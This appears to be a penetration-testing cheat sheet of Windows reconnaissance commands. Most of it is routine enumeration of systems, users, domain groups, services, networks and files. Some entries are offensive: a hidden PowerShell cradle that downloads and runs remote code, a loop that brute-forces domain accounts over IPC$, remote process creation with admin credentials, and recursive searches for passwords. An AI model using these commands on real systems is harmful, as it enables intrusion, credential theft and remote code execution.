**Authors**: < [nixawk](https://github.com/nixawk) >, < [patitoaxel](https://github.com/patitoaxel) >

----

# Information Gathering - Windows

## System Architecture

|**Command**|**Description**|
|:----------|:--------------|
|ver|Displays the Windows version.|
|systeminfo<BR>systeminfo /S `ComputerName` /U `username` /P `password`|This tool displays operating system configuration information for a local or remote machine, including service pack levels.|
|wmic os list brief|Installed Operating System/s management.|
|wmic computersystem list full|Computer system management.|

## Processes

|**Command**|**Description**|
|:----------|:--------------|
|tasklist<BR>tasklist /M<BR>tasklist /V|displays a list of currently running processes on a local machine.|
|tasklist /FI "IMAGENAME eq cmd.exe"<BR>tasklist /FI "PID ne 0"|Displays a set of processes that match a given criteria specified by the filter.|
|tasklist /S `SERVER` /U `DOMAIN\username` /P `password`|displays a list of currently running processes on remote machine.|
|wmic process list brief|Process management.|

## Users and Groups

|**Command**|**Description**|
|:----------|:--------------|
|whoami|Lists information about the user you are currently logged in as.|
|net user|displays user account information.|
|net user /domain|Performs the operation on the domain controller in the computer's primary domain.|
|net localgroup administrators|displays the local administrators group on the computer.|
|net localgroup administrators /domain|displays the local administrators group on current domain controller.|
|net group /domain|Display groups and performs the operation on the domain controller in the current domain. |
|net group "Domain Admins" /domain|Query users from domain admins in current domain.|
|net group "Domain Computers" /domain|Query all domain computers in current domain.|
|net group "Domain Controllers" /domain|Query Domain Comtrollers Computers.|
|net group "Domain Policy Creator Owners" /domain|Query Domain Policy Creators.|
|net accounts /domain|Updates the user accounts database and modifies password and logon requirements for all accounts. Performs the operation on the primary domain controller of the current domain.|
|wmic useraccount|User account management.|
|wmic useraccount LIST BRIEF|Print account information.|

## Services

|**Command**|**Description**|
|:----------|:--------------|
|sc qc `servicename`|Queries the configuration information for a service. (**BINARY_PATH_NAME** and so on.)|
|sc query `servicename`|Queries the status for a service, or enumerates the status for types of services.|
|sc create cmdsys type= own type= interact binPath= "c:\windows\system32\cmd.exe /c cmd.exe" & sc start cmdsys|Creates a service entry in the registry and Service Database.|

## Security

|**Command**|**Description**|
|:----------|:--------------|
|wmic qfe get hotfixid| Information about patches installed on the windows|
|NETSH FIREWALL show all|Show Allowed programs configuration for Domain/Standard profile.|


## Networking

|**Command**|**Description**|
|:----------|:--------------|
|ipconfig /all|Displays the full TCP/IP configuration for all adapters. |
|ipconfig /displaydns|Displays the contents of the DNS client resolver cache, which includes both entries preloaded from the local Hosts file and any recently obtained resource records for name queries resolved by the computer. The DNS Client service uses this information to resolve frequently queried names quickly, before querying its configured DNS servers.|
|netstat -ano|Displays active TCP connections and includes the process ID (PID) for each connection. |
|netstat -ano -p tcp|Show tcp connections.|
|netstat -ano -p udp|Show udp connections.|
|netstat -r|Displays the system's routing table.|
|route print|Displays the system's routing table.|
|net view|Displays a list of domains, computers, or resources that are being shared by the specified computer. |
|net view /domain:`DOMAINNAME`|Specifies the domain for which you want to view the available computers. If you omit DomainName, /domain displays all of the domains in the network.|
|net view \\\\`ComputerName`|Specifies the computer that contains the shared resources that you want to view.|
|wmic /node:DC1 /user:DOMAIN\domainadminsvc /password:domainadminsvc123 process call create "cmd /c vssadmin list shadows 2>&1 > c:\temp\output.txt"|Create a new process on remote server.|
|powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://ip:port/[file]'))"|Execute code from remote server.|
|powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://ip:port/file', 'C:\Windows\temp\testfile')"|Download a file from remote server.|


## File Systems

|**Command**|**Description**|
|:----------|:--------------|
|type C:\Windows\system32\demo.txt|Show the contents of a file. |
|dir /a|Displays files with specified attributes.|
|dir /s|Searches sub-directories|
|dir /s "\*`match-text`\*"|Searches for the word entered in the `match-text` section in all sub-dirs of the current directory.|
|find /I `password` C:\Windows\System32\*.ini|Searches for a `password` string in a file or files.|
|tree /F C:\Windows\system32|Graphically displays the folder structure of a drive or path.|
|fsutil fsinfo drives|Lists the current drives on the system.|
|wmic volume|Local storage volume management.|
|wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber|Local storage device management.|
|net share|displays information about all of the resources that are shared on the local computer.|
|wmic share|Shared resource management.|
|net use \\\\`ip`\ipc$ `password` /user:`username`|Connects a computer to or disconnects a computer from a shared resource, or displays information about computer connections. |
|@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\\\DomainController\IPC$ /user:<DomainName>\%n %p 1>NUL 2>&1 && @echo [*] %n:%p &&|Bruteforce Windows accounts|
|FOR /F %f in ('dir /b /s C:\') do find /I "password" %f|Search `password` in file or files from C:\|




## Startup and Shutdown

|**Command**|**Description**|
|:----------|:--------------|
|wmic startup|Management of commands that run automatically when users log onto the computer system.|

# Links

1. [Windows Internals Book](https://technet.microsoft.com/en-us/sysinternals/bb963901.aspx).
